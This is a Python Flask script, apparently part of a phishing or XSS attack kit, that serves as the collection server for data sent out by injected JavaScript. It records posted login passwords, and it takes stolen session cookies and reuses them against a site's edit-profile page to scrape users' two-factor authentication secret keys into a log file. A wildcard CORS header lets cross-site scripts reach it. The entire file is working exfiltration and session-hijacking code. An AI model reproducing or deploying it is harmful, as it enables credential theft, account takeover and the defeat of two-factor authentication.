# harvester.py runs a flask server that handles data sent to it by the malicious JS

from flask import Flask, request, Response
import requests
from bs4 import BeautifulSoup
from datetime import datetime
app = Flask(__name__)
f = open('data.txt', 'w')

# Quick and dirty method that uses requests and BeautifulSoup to request the user profile page
# using their current session, and print out the 2FA secret key.
def grab_2FA(cookie):
    url = "http://searching.party/index.php/edit-profile"
    name = cookie.split('=')[0]
    data = cookie.split('=')[1]
    cookies = {name: data}
    print cookies
    f.write(str(cookies) + '\n')
    r = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(r.text, 'html.parser')
    for i in soup.find_all('td'):
	if(i.text.strip() != 'Account' and i.text.strip() != 'Key'):
            f.write(i.text.strip() + '\n')
            print i.text.strip()

# Handles cookies passed to the root of the domain and calls the method to scrape 2FA secret keys
@app.route('/', methods=['POST', 'GET'])
def get_2fa():
    #return "Hello world!"
    if(request.method == 'GET'):
        return "GET"
    grab_2FA(request.data)
    resp = Response("Phishing!")
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp

# Prints out login credentials passed to it
@app.route('/passwords', methods=['POST', 'GET'])
def process_password():
    if(request.method == 'GET'):
        return "GET"
    f.write(request.data + " -- " + str(datetime.utcnow()) + '\n')
    print request.data +  " -- " + str(datetime.utcnow())
    resp = Response("That's your password!")
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp

if __name__ == '__main__':
    app.run(port=8000, debug=True)
